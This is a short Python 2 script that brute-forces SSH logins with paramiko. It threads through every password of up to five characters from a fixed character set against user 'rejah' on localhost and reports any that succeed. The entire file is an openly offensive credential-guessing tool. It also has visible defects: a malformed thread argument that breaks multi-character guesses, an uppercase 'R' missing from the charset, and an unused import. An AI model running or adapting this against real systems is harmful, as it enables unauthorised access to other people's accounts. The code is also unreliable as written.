#!/usr/bin/python
import paramiko, sys, os, socket, threading, time 
import itertools,string,crypt

PASS_SIZE = 5

def bruteforce_list(charset, maxlength):
    return (''.join(candidate)
        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
        for i in range(1, maxlength + 1)))


def attempt(Password):

    IP = "127.0.0.1"
    USER = "rejah"
    PORT=22
      
    try:

        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
 
        try:
            ssh.connect(IP , port=PORT, username=USER, password=Password)
            print "Connected successfully. Password = "+Password
        except paramiko.AuthenticationException, error:
            print "Incorrect password: "+Password
            pass
        except socket.error, error:
            print error
            pass
        except paramiko.SSHException, error:
            print error
            print "Most probably this is caused by a missing host key"
            pass
        except Exception, error:
            print "Unknown error: "+error
            pass    
        ssh.close()
     
    except Exception,error :
        print error

letters_list = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQSTUVWXYZ1234567890!@#$&()'


for i in bruteforce_list(letters_list, PASS_SIZE):
    t = threading.Thread(target=attempt, args=(i))
    t.start()
    time.sleep(0.3)

sys.exit(0)



